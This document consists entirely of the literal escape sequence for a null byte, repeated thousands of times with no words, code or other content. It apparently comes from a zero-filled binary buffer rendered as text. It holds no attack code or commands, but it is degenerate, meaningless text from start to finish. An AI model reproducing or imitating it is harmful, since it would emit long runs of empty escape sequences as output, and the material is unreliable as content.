\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00